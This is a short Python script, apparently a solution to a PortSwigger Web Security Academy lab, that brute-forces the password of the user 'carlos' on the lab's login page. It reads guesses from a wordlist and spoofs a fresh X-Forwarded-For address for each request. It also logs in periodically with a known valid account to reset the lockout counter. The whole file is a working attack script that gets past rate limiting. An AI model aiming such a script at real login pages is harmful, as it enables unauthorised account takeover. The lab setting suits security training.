import requests

URL = "https://0acd00d303371a6780c5f8d500de0046.web-security-academy.net/login"

ips = []
for i in range(256):
    ips.append("10.25.13." + str(i))
    


with open("password.txt", 'r') as passwords_file:
    for password in passwords_file:
        dataa = {'username': "wiener", 'password': "peter"}
        requests.post(URL, data=dataa, headers={'X-Forwarded-For':'10.10.200.25'})
        requests.post("https://0acd00d303371a6780c5f8d500de0046.web-security-academy.net/logout", headers={'X-Forwarded-For':'10.10.200.24'})
        password = password.strip('\n')
        data = {'username': "carlos", 'password': password}
        ip = ips.pop(0)
        headers = {
            'X-Forwarded-For': ip
        }
        response = requests.post(URL, data=data, headers=headers)

        if response.status_code == 302:
            print("Login r√©ussi avec:", data)
            break

